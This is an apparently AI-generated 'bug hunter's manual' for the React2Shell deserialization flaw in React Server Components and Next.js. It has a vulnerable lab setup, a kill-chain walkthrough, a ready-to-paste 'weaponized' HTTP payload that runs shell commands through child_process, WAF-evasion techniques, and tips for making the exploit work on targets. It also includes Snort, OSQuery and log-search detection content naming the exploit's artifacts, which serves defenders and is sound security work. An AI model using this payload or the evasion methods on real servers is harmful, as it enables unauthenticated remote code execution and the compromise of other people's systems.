Here is the **Ultimate Bug Hunter's Manual for React2Shell (CVE-2025-55182)**. This version is significantly expanded to include a complete lab setup guide, a granular breakdown of the exploit logic, advanced WAF evasion techniques, and a deep dive into the detection rules provided.

-----

# **The Ultimate Bug Hunter's Manual: React2Shell (CVE-2025-55182)**

## **Table of Contents**

1.  [Vulnerability Profile](https://www.google.com/search?q=%231-vulnerability-profile)
2.  [Lab Setup: Building a Valid Target](https://www.google.com/search?q=%232-lab-setup-building-a-valid-target)
3.  [Deep Dive: The "Flight" Protocol Mechanics](https://www.google.com/search?q=%233-deep-dive-the-flight-protocol-mechanics)
4.  [The Kill Chain: Step-by-Step Exploit Analysis](https://www.google.com/search?q=%234-the-kill-chain-step-by-step-exploit-analysis)
5.  [The Weaponized Payload (Raw HTTP)](https://www.google.com/search?q=%235-the-weaponized-payload-raw-http)
6.  [Detection Engineering (Snort, OSQuery, Logs)](https://www.google.com/search?q=%236-detection-engineering-snort-osquery-logs)
7.  [Bypassing Defenses: WAF Evasion](https://www.google.com/search?q=%237-bypassing-defenses-waf-evasion)
8.  [Common Pitfalls & Troubleshooting](https://www.google.com/search?q=%238-common-pitfalls--troubleshooting)
9.  [Works Cited](https://www.google.com/search?q=%23works-cited)

-----

## **1. Vulnerability Profile**

  * **CVE:** CVE-2025-55182 (React) / CVE-2025-66478 (Next.js)
  * **Name:** React2Shell
  * **CVSS Score:** **10.0 (Critical)**
  * **Type:** Insecure Deserialization leading to Remote Code Execution (RCE).
  * **Vector:** Unauthenticated HTTP POST request to Next.js App Router endpoints.
  * **Root Cause:** The `react-server-dom-webpack` package fails to validate export names during Flight protocol deserialization, allowing attackers to traverse the prototype chain (`__proto__`, `constructor`) and execute arbitrary code via the `Function` constructor.

-----

## **2. Lab Setup: Building a Valid Target**

**Warning:** Many public PoCs are "fake" because they rely on broken, pre-bundled apps. To truly study this bug, you must build a clean environment with the specific vulnerable versions.

### **2.1 The Vulnerable Dependency Tree**

Create a `package.json` with these exact versions. Do not use `latest` as the patch has been released.

```json
{
  "name": "react2shell-lab",
  "version": "1.0.0",
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start"
  },
  "dependencies": {
    "next": "16.0.6",        // VULNERABLE (Fixed in 16.0.7)
    "react": "19.2.0",       // VULNERABLE (Fixed in 19.2.1)
    "react-dom": "19.2.0",   // VULNERABLE (Fixed in 19.2.1)
    "pm2": "^6.0.14"
  }
}
```

### **2.2 Installation & Running**

1.  Run `npm install`.
2.  Create a simple page (e.g., `app/page.tsx`). *Note: You do not need to create a Server Action. The vulnerability exists in the internal router itself.*
3.  Run `npm run dev`.
4.  The server will now be listening on port 3000, vulnerable to the Flight payload.

-----

## **3. Deep Dive: The "Flight" Protocol Mechanics**

React Server Components (RSC) communicate using the **Flight** protocol. It replaces JSON to allow streaming of complex UI trees. Understanding its syntax is key to manipulating the deserializer.

### **3.1 The Syntax Dictionary**

| Token | Name | Function | Exploit Context |
| :--- | :--- | :--- | :--- |
| **`$`** | **Reference** | Points to another ID in the stream (e.g., `$1`). | Used to jump between objects in the payload. |
| **`:`** | **Access** | Delimiter for property paths (e.g., `$1:key`). | **The Flaw:** `$1:__proto__` allows unauthorized traversal. |
| **`@`** | **Promise** | Marks a value as a Promise/Lazy. | **The Trigger:** Forces the server to "resolve" a malicious object. |
| **`$B`** | **Blob** | Binary data reference. | **The Sink:** Triggers the `_formData` code path where execution happens. |

-----

## **4. The Kill Chain: Step-by-Step Exploit Analysis**

How does a text payload turn into a shell? Here is the internal execution flow:

1.  **Ingestion:** The server receives the `multipart/form-data` POST request. The `Next-Action` header tells Next.js to parse the body as a Flight stream.
2.  **Deserialization (The Setup):**
      * The parser reads the JSON payload.
      * It sees `"then": "$1:__proto__:then"`. This sets the `then` property of the object to point to the `then` method of its own prototype.
      * This structure mimics a JavaScript **Promise** (a "Thenable").
3.  **Resolution (The Trigger):**
      * Because the object looks like a Promise, React attempts to "resolve" it.
      * The resolved value is defined as `{"then": "$B1337"}`.
      * The parser sees `$B` (Blob) and calls the internal Blob Handler.
4.  **Pollution (The Weapon):**
      * The Blob Handler attempts to fetch form data by calling `_formData.get()`.
      * **CRITICAL:** The attacker has polluted `_formData` in the JSON:
        `"_formData": { "get": "$1:constructor:constructor" }`
      * Instead of the real `get` function, the server fetches `$1` (the module), accesses `constructor` (Object), then `constructor` again (Function).
5.  **Execution (RCE):**
      * The code effectively executes: `new Function(args)`.
      * The `args` are supplied by the `_prefix` field in the payload: `process.mainModule.require('child_process')...`
      * **BOOM:** The code runs in the context of the Node.js server process.

-----

## **5. The Weaponized Payload (Raw HTTP)**

This is the **"Reflected RCE"** variant. It executes `id`, captures the output, and throws it as a fake "Redirect Error", causing Next.js to return the command output in the HTTP response body.

**Copy/Paste into Burp Repeater:**

```http
POST / HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

-----

## **6. Detection Engineering (Snort, OSQuery, Logs)**

Regular user browsing traffic *never* looks like this. Defenders can create high-fidelity alerts based on the specific headers and body artifacts required by the exploit.

### **6.1 Network Detection (Snort v3)**

This rule specifically hunts for the combination of `Next-Action`, `multipart/form-data`, and the unique JSON keys used in the exploit chain.

```bash
alert http any any -> $LAN_NETWORK any (
    msg:"Potential Next.js React2Shell / CVE-2025-66478 attempt";
    flow:to_server,established;
    content:"Next-Action"; http_header; nocase;
    content:"multipart/form-data"; http_header; nocase;
    # Detect the specific multipart field name="0"
    pcre:"/Content-Disposition:\s*form-data;\s*name=\"0\"/s";
    # Detect the "resolved_model" state required for the gadget
    pcre:"/\"status\"\s*:\s*\"resolved_model\"/s";
    # Detect the prototype pollution trigger
    pcre:"/\"then\"\s*:\s*\"\$1:__proto__:then\"/s";
    classtype:web-application-attack;
    sid:6655001;
    rev:1;)
```

*Logic:* Legitimate Flight requests rarely use `resolved_model` or `__proto__` references in this specific sequence.

### **6.2 Endpoint Detection (OSQuery)**

Use this to scan your infrastructure for installed vulnerable packages (`react-server-dom-*` versions 19.0.0, 19.1.x, 19.2.0).

```json
{
  "queries": {
    "detect_rev2shell_react_server_components": {
      "query": "SELECT name, version, path FROM npm_packages WHERE (name='react-server-dom-parcel' AND (version='19.0.0' OR (version >= '19.1.0' AND version < '19.1.2') OR version='19.2.0')) OR (name='react-server-dom-turbopack' AND (version='19.0.0' OR (version >= '19.1.0' AND version < '19.1.2') OR version='19.2.0')) OR (name='react-server-dom-webpack' AND (version='19.0.0' OR (version >= '19.1.0' AND version < '19.1.2') OR version='19.2.0'));",
      "interval": 3600,
      "description": "Detects vulnerable versions of React Server Components packages (react-server-dom-*) affected by CVE-2025-55182 / CVE-2025-66478 / React2Shell.",
      "platform": "linux,windows,macos",
      "version": "1.0"
    }
  }
}
```

### **6.3 Log Analysis (SIEM)**

Query your logs (Splunk/ELK) for:

  * **Header:** `Next-Action: dontcare` (Attackers often use arbitrary values here).
  * **Body Content:** `__proto__`, `process.mainModule`, `child_process`.
  * **Status Codes:** Spikes in `500` errors on root endpoints (failed exploit attempts).

-----

## **7. Bypassing Defenses: WAF Evasion**

If the raw payload is blocked, bug hunters can use the following techniques to bypass weak WAF signatures.

### **7.1 Unicode Escaping**

The Flight parser processes JSON, which natively supports Unicode escapes. WAFs looking for `child_process` (ASCII) will miss the escaped version.

  * **Original:** `child_process`
  * **Bypass:** `\u0063\u0068ild_process`
  * **Original:** `__proto__`
  * **Bypass:** `\u005f\u005fproto\u005f\u005f`

### **7.2 Payload Chunking**

The Flight protocol is a stream. You can theoretically split the sensitive keywords across multiple lines or chunks if the WAF inspects packets individually.

  * *Technique:* Send the header in packet A, the `__proto__` trigger in packet B, and the execution payload in packet C.

-----

## **8. Common Pitfalls & Troubleshooting**

**Q: I get a 404 Not Found.**

  * **A:** You might be hitting an endpoint that doesn't support RSC. Try the root path `/` or check if the target uses a base path (e.g., `/app/`). Also, ensure the `Next-Action` header is present (even if the value is garbage).

**Q: I get a 500 Internal Server Error.**

  * **A:** This usually means the vulnerability **IS** present, but the payload syntax was slightly wrong, crashing the parser.
      * *Check:* Are you using the correct multipart boundary?
      * *Check:* Did you escape the quotes inside the JSON string correctly? (`"value": "{\"then\": ...}"`)

**Q: The exploit works in the PoC app but not my target.**

  * **A:** The target might be patched, OR it might be running on a simplified runtime (like Edge Runtime) where `child_process` is not available. Try changing the payload to `console.log('pwned')` to check for execution without relying on Node.js specifics.

-----

## **Works Cited**

| \# | Source Title & Link |
| :--- | :--- |
| [1.5] | [**TryHackMe:** React2Shell: CVE-2025-55182 Deep Dive](https://tryhackme.com/room/react2shellcve202555182) |
| [4.6] | [**Searchlight Cyber:** High Fidelity Detection Mechanism for RSC RCE](https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478/) |
